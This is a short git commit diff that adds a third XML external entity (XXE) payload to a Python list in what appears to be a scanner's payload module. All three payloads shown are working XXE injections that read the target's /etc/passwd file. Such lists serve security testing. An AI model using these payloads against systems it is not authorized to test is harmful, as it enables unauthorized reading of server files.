342beb1bb9aa1627a3b56b3e8ce1d051e6de1df5
Mrx <143259711+akuajalah01@users.noreply.github.com>
2026-05-13 00:19:36 +0700

    Add new XXE payload to xxe_payloads.py

--- core/payloads/xxe_payloads.py
+++ core/payloads/xxe_payloads.py
@@ -1,4 +1,5 @@
 XXE_PAYLOADS = [
     '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
-    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''
+    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
+    '''<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "file:///etc/passwd">]><r>&sp;</r>'''
 ]
